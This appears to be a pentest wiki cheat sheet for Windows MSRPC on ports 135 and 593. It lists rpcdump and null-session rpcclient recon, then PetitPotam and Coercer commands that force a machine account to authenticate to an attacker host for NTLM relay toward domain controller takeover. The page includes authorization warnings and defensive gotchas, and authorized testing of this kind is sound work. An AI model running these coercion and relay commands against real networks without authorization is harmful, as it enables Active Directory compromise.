---
service: msrpc
title: MSRPC Endpoint Mapper
ports: 135, 593
aliases: epmap, loc-srv, msrpc
---

# MSRPC — quick wins

**When you see it:** 135/tcp open → the Windows RPC endpoint mapper. On its own it's recon,
but the endpoints it lists include the coercion interfaces (MS-EFSR, MS-RPRN, MS-DFSNM) that
force a machine account to authenticate to you — the front end of an NTLM relay to AD CS /
LDAP. This is a read-only mapper probe; coercion itself is a separate authorized step.

> Authorized testing only. Triage (rpcdump) is read-only. Coercion (marked ✏️) makes the
> target authenticate outbound to a host you name — only run it with relay infrastructure and
> written sign-off; it can be noisy and is a real auth event.

## Triage (read-only)
```sh
impacket-rpcdump H                          # or rpcdump.py — full endpoint/interface list
rpcdump.py H | grep -iE "efs|spool|dfs|fax"  # coercion-relevant interfaces
rpcclient -U '' -N H                         # null session (srvinfo, enumdomusers)
nmap -p 135 --script msrpc-enum H
```

## Quick wins

### Endpoint mapper dump → interface inventory
```sh
impacket-rpcdump H
```
*Why:* lists every registered RPC interface + its dynamic port — reveals which coercion and
management interfaces the host exposes (EFSRPC, spoolss, DFS, task scheduler) and where they
bind, guiding both coercion and lateral movement.

### Coercion → NTLM relay front-end ✏️
```sh
# force the machine account to auth to ATT (run a relay/Responder there):
petitpotam.py -u USER -p PASS ATT H          # MS-EFSR  (CVE-2021-36942 family)
coercer coerce -u USER -p PASS -t H -l ATT   # sweeps MS-RPRN/MS-EFSR/MS-DFSNM/MS-FSRVP
```
*Why:* PetitPotam (MS-EFSR) / PrinterBug (MS-RPRN) / DFSCoerce (MS-DFSNM) make the target's
machine account authenticate to `ATT`; relayed to AD CS HTTP enrollment (ESC8) or LDAP that
yields a DC takeover. Even an unauthenticated PetitPotam works on unpatched hosts.

### Null-session recon via rpcclient
```sh
rpcclient -U '' -N H -c 'srvinfo;enumdomusers;querydominfo'
```
*Why:* where the null session is allowed, you pull OS version, domain users, and password
policy over the same RPC surface — no creds needed.

## aranum helpers
- `aranumtoolkit/network/enum-msrpc.sh` — dispatcher (impacket-rpcdump → rpcdump.py → rpcclient → nmap `msrpc-enum`, read-only).
- See also `wiki/smb.md`, `wiki/ldap.md`, `wiki/kerberos.md` for the relay/AD side.

## Gotchas
- The mapper (135) hands out *dynamic* high ports for each interface — the actual RPC call goes there, so firewalls that only allow 135 may still block the follow-up.
- Coercion is loud and logged (machine-account auth to an unusual host) — coordinate with the blue team / engagement owner.
- SMB signing enforced + EPA on AD CS neutralizes most relays — check `enum-smb.sh` signing status before investing in coercion.
- 593/tcp is RPC-over-HTTP (the same mapper) — probe it too when 135 is filtered.

## Sources
- impacket `rpcdump.py`/`petitpotam.py`; Coercer (p0dalirius); PetitPotam / PrinterBug / DFSCoerce advisories; HackTricks `135-pentesting-msrpc`.
